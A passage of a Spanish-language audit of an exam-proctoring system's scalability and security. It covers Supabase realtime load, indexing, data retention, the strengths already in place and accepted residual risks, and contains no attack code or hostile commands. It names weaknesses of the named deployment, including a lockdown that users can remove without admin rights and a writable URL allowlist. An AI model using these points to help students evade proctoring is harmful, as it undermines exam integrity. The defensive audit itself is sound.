`MainWindow.xaml.cs:1780-1783, 1843-1847, 1883-1888` (+App.xaml.cs:80) · Patrón sync-over-async repetido 4 veces; cambiar la política de liberación obliga a editar los cuatro. **Recomendación:** `CheatWindowFactory.Create(kind, context)`.

### 3.5 Escalabilidad

#### scalability-02 — Suscripciones Realtime duplicadas: ~25-40 canales por pestaña del panel — **MEDIUM** (realtime-load)
`admin-next/hooks/useRealtimeTable.ts:40-81`; `Panel.tsx:60-112` · `useRealtimeTable` genera un topic único por instancia (`useId()`) y `Panel` deja TODAS las secciones montadas, así cada tabla se suscribe 3-5 veces como canales independientes (online_clients ×3, suspicious_processes ×3, courses/sections ×~5). El conteo real es ~40 canales/pestaña. Cada cambio obliga al servidor a evaluar RLS y entregar el mismo mensaje N veces (la conexión WS es una sola; lo que se multiplica es entrega de mensajes y carga de canales; con N profesores: ~40N). **Recomendación:** centralizar suscripciones en un singleton por tabla vía Context que multiplexe consumidores; o desmontar secciones inactivas; o consolidar tablas en un canal con varios `.on()` antes de `subscribe()`.

#### scalability-06 — Techo duro de `online_clients`: top-N sin filtro server-side oculta alumnos del monitoreo — **MEDIUM** (bottleneck/correctitud)
`admin-next/.../SectionWorkspace.tsx:55-100`; `OnlineClientsSection.tsx:57-59` · Trae `online_clients` con `order last_seen desc limit 200` (y 100 en OnlineClientsSection) **sin filtro por sección server-side**; pertenencia y ventana online (<90s) se calculan en cliente. Como la tabla nunca se purga y no hay scoping por `section_id`, **varias secciones simultáneas suman al mismo techo**: ~3 secciones de ~35 alumnos cruzan los 100. Por encima del cap, alumnos genuinamente online caen fuera del top-N y se muestran offline, **subcontando el online y ocultando flags de procesos sospechosos**. Es fallo de correctitud bajo carga, no solo rendimiento. **Recomendación:** filtrar server-side por `last_seen > now()-90s` y por `section_id`; usar `idx_online_last_seen`; purgar filas long-stale.

#### scalability-01 — Fan-out del heartbeat reemite la fila completa (incl. `processes` JSONB) cada 20s/alumno — **LOW** (realtime-load)
`supabase-all-in-one.sql:179-193`; `MainWindow.xaml.cs:1896-1923` · `last_seen` cambia siempre → cada latido genera UPDATE realtime con la fila nueva completa incluido `processes` (todas las ventanas abiertas). **Matiz:** a la escala real (per-sección, ~50-200 clientes → 2.5-10 UPDATEs/s, payload pocos KB) no se materializa cuello de botella (la cuota de ~500 msg/s exigiría ~10k clientes). **Recomendación:** usar Realtime Presence para "quién está online" o mover `processes` a tabla aparte fuera de la publicación realtime; diff y escribir solo on-change; `REPLICA IDENTITY` a columnas mínimas.

#### scalability-03 — Tablas append-only sin retención ni particionamiento — **LOW** (data-growth)
`setup-supabase.sql:31-98`; `SupabaseClient.cs:686-696` · `browser_history`/`student_activity`/`process_alerts`/`cheat_events` solo reciben INSERT, sin DELETE/pg_cron/TTL/partición. `browser_history` (un INSERT por navegación) es la que más crece. Residual real: almacenamiento monótono entre semestres + **retención indefinida de PII** sin política (gap de gobernanza). **Recomendación:** job pg_cron de retención (30-60 días o "fin de evaluación + X"); particionar por fecha con drop de particiones O(1).

#### scalability-04 — Faltan índices para las consultas "últimos N" del panel — **LOW** (indexing)
`setup-supabase.sql:31-55` · `cheat_events` sin ningún índice (solo PK) y se consulta `order detected_at desc limit 50` → seq scan + sort; `browser_history`/`student_activity` sin índice de orden puro; la dedup de `report_process_alert` filtra por `(pc_name, process_name)` sin índice. Lecturas authenticated admin-only (no DoS student-reachable). **Recomendación:** `CREATE INDEX idx_cheat_detected ON cheat_events(detected_at DESC)`, idem `browser_history(visited_at DESC)`, `student_activity(created_at DESC)`, `process_alerts(pc_name, process_name, detected_at DESC)`.

#### scalability-05 — Amplificación de queries: ~6-8 REST/tick/alumno, `control` leída 2-3 veces — **LOW** (polling-load)
`MainWindow.xaml.cs:1633-1642`; `SupabaseClient.cs:141-192` · `AdminTickAsync` (cada 20s) encadena 7 awaits; `control id=1` se lee 2-3 veces/tick. A escala real (~300 alumnos → ~135 req/s de lookups indexados sub-ms) está dentro de capacidad; la saturación del pooler no se materializa. **Edge real que el hallazgo no enfatizó:** los 7 awaits secuenciales (timeout 10s c/u) bajo `DispatcherTimer` **sin guard de reentrancy** pueden solapar ticks cuando el backend está degradado, amplificando carga justo en el peor momento. **Recomendación:** consolidar el tick en UNA RPC `client_tick(pc, user, eval_id)`; eliminar la doble lectura de `control`; jitter en el intervalo; guard de reentrancy.

#### scalability-07 — Polling a GitHub cada tick sin backoff ante 403/429 — **LOW** (rate-limit)
`MainWindow.xaml.cs:1333-1348`; `GitHubService.cs:246-295` · `UpdateAssignmentsBanner` dispara `GetPendingInvitations` + `ListRepos` cada 20s (~360 req/h/alumno). El límite de 5000/h es per-usuario (escala horizontal), pero no hay manejo de rate-limit: `catch { return new(); }` sin leer `X-RateLimit-Remaining`/`Retry-After`. Ante un 403 (secondary rate limit en exámenes largos) sigue golpeando y el banner muestra estado falso ("0 repos"). **Recomendación:** cachear repos/invitations con cadencia 2-5 min o on-demand; leer headers y aplicar backoff exponencial; diferenciar "sin repos" de "rate-limited".

#### scalability-09 — Crecimiento de memoria sin techo en el panel — **INFO** (client-memory)
`useRealtimeTable.ts:56-71`; `SectionWorkspace.tsx:70-84` · Hooks sin `limit` traen `select *` completo y acumulan toda fila insertada en estado React por la vida de la pestaña (acceptances/submissions crecen una fila por alumno×evaluación). Costo dominante real: el fetch inicial + los `useMemo` que iteran todas las filas en cada render. **Recomendación:** acotar fetches por evaluación/sección activa server-side; `limit` razonable; conteos agregados vía RPC.

#### scalability-10 — Proyecto Supabase único: REST+Realtime+Postgres comparten compute — **INFO** (capacity-planning)
`admin-next/lib/supabase.ts:14-16` · Trade-off consciente de simplicidad operativa. A escala DUOC real (~100-200 clientes, ~40-70 req/s) no satura; solo justifica medir el peor caso y monitorear el pooler/Realtime. **Recomendación:** dimensionar el compute para el pico (N × cadencia + fan-out); tras aplicar scalability-01/02/05 reevaluar; documentar el techo de alumnos por tier.

#### scalability-11 — Mitigaciones de escalabilidad YA presentes (no son defectos) — **INFO** (by-design)
`supabase-all-in-one.sql:196-209`; `MainWindow.xaml.cs:1644-1675` · Documentado para no reportar como problema lo bien resuelto: (1) UPSERT con `UNIQUE(pc_name, github_username)` acota cardinalidad de online_clients; (2) `report_process_alert` con anti-flood server-side de 30s; (3) `CheckNetworkProbeAsync` throttle 30s + dedup 5 min; (4) fetches degradan a fallback sin reintentar en bucle apretado. **Recomendación:** preservar estos mecanismos al introducir la RPC única por tick.

## 5. Lo que ya está bien (fortalezas reales)

Una evaluación justa reconoce decisiones correctas y bien implementadas:

- **Anon key tratada como pública por diseño** (comentario explícito en Config.cs). El error no es exponerla, sino confiar en escrituras anon — pero el modelo conceptual de "RLS/RPC como control real" es el correcto.
- **PII fuerte correctamente protegida**: `enrollments` (full_name, email, blackboard_student_id) es authenticated-only; `get_my_enrollment` está diseñada para NO devolver PII (solo section_id/status/found). Acierto de diseño.
- **Restricción consistente en la mayoría de tablas sensibles**: `browser_history`, `cheat_events`, `process_alerts`, `online_clients` son authenticated-read (solo submissions/acceptances/targeted_lockdowns quedaron anon-read — son la excepción, no la regla).
- **Hardening criptográfico del password del profe**: PBKDF2-HMAC-SHA256, salt de 16 bytes, 200k iteraciones, comparación en tiempo constante con `FixedTimeEquals`. Bien resuelto (el problema es el modelo de secreto compartido, no la cripto).
- **DPAPI + InPrivate**: el token se cifra en reposo (DPAPI CurrentUser) y el navegador embebido usa InPrivate sin persistir cookies (mitiga el lado web; el residual es token.dat en cuenta compartida).
- **Guarda anti-traversal correcta** con `Path.GetFileName` en ExamPdfService (el faltante es la allowlist de extensión, no el traversal).
- **Fail-safe degradar-cerrado** en `GetEffectiveControlAsync`: ante fallo de red retiene el lock conocido (decisión de seguridad correcta).
- **Mitigaciones de escalabilidad ya presentes** (scalability-11): UPSERT que acota cardinalidad, dedup server-side de alertas (30s), throttle de la sonda de red (30s/5min), degradación a fallback sin bucle apretado.
- **Separación de lectura en el panel**: hooks realtime (`useRealtimeTable`, `useControl`) encapsulan bien fetch+suscripción; la inconsistencia está solo en las escrituras.
- **Acciones destructivas del panel gated por diálogos nativos** (`window.confirm`/`window.prompt`), lo que neutraliza el clickjacking en la práctica.

## 6. Límites inherentes y residual aceptable

Varios hallazgos LOW de seguridad describen **trade-offs conscientes** cuyo residual es aceptable **si se documenta explícitamente**:

- **Lockdown client-side sin admin (`asInvoker`)** — sec-client-05, sec-client-06, sec-client-10. Toda la persistencia es HKCU/usuario y por tanto removible sin elevación; el bloqueo de internet solo afecta apps que respetan el proxy WinINET. Esto **no se puede sellar** sin un componente con privilegios (servicio) o políticas de dominio, fuera del alcance actual. **Residual aceptable:** el lockdown es **disuasivo**, no enforcement. El control real ya existe y es el correcto: heartbeat + detección server-side + revisión del profe vía panel (`targeted_lockdowns`/`online_clients`). Recomendación: **documentar** esta postura en el README y NO invertir en endurecer el kiosk sin admin; si se requiere enforcement fuerte, planificar un componente elevado.

- **Rate-limit de GitHub per-usuario** — scalability-07. Cada alumno usa su propio token (límite 5000/h per-usuario, escala horizontalmente). El residual a cerrar no es el límite sino la **falta de backoff** ante 403/429.

- **Proyecto Supabase único** — scalability-10. Simplicidad operativa a cambio de compute compartido. A la escala real de DUOC no satura; el residual es de **planificación de capacidad**, no de código.

- **Oráculo de `get_my_enrollment`** — sec-backend-11. Permite probar si un github está inscrito en una sección, pero **sin PII**. Trade-off razonable; cerrable con rate-limit si se desea.

**Distinción clave para el equipo:** la mayoría de los límites client-side son aceptables PORQUE el sistema fue diseñado con un plano de control server-side (panel + heartbeat + lockdown dirigido). El problema grave NO son esos límites inherentes, sino que **ese mismo plano server-side confía en escrituras anon sin binding de identidad** (sección 3.2). Cerrar esa brecha de confianza es lo que convierte el lockdown disuasivo en un sistema de proctoring defendible.

### A03 — Injection — APLICA (sin hallazgos explotables)

Sin hallazgos relevantes de inyección. Verificado:

- **SQL**: el panel usa `supabase-js`/PostgREST (parametrizado). Las RPC plpgsql usan INSERT parametrizado, no concatenación; el único `EXECUTE format(...)` usa `%I` (identificador, seguro) en el bloque de realtime (`supabase-all-in-one.sql:435`). Los filtros PostgREST armados por string en `SupabaseClient` interpolan o `long` tipados (`evaluation_id=eq.{id}`, `section_id=eq.{sectionId}` — `:104,229,246,248`) o strings con `Uri.EscapeDataString` (`:62,291,379,537`). Sin vector de SQLi.
- **Command/Path injection (cliente)**: `schtasks` se invoca con `TaskName` constante y `Environment.ProcessPath` (`DaemonService.cs:30,47`), sin entrada de usuario. `ExamPdfService` sanea con `Path.GetFileName` antes de escribir y abre dentro de un temp dir (`ExamPdfService.cs:49-56`). No hay paso de strings no confiables a un shell.
- **XSS (panel)**: React escapa por defecto; sin `dangerouslySetInnerHTML`/`innerHTML`. `window_title`, `process_name`, repos y nombres reportados por el cliente se renderizan como texto.

Recomendación: mantener la disciplina. Si en el futuro se renderiza HTML de campos reportados por el cliente (que SON forjables por anon, ver A01-#4), no usar `dangerouslySetInnerHTML`.

### A10 — Server-Side Request Forgery (SSRF) — NO APLICA

Sin hallazgos. El cliente sólo hace requests a hosts fijos (`Config.SupabaseUrl`, `github.com`, `api.github.com`). El WebView2 navega contra una allowlist (sufijo de host / prefijo de URL) — `Config.cs:118-211` — y la descarga de PDF está acotada al bucket `exam-pdfs` + `Path.GetFileName` (`ExamPdfService.cs:49-56`). Nota (no es SSRF): la allowlist dinámica `allowed_urls` es escribible por cualquier `authenticated` (`migration-allowed-urls.sql:61`), por lo que un usuario autenticado podría añadir un dominio para ampliar lo navegable durante el lockdown. Mitigante parcial verificado: el cliente cae a la lista hardcodeada más restrictiva si el fetch falla/vuelve vacío (un fetch fallido nunca amplía lo permitido — `Config.cs:182-191`), pero un INSERT exitoso de un authenticated sí amplía. Es A01/A04 (control de acceso/diseño), no SSRF.
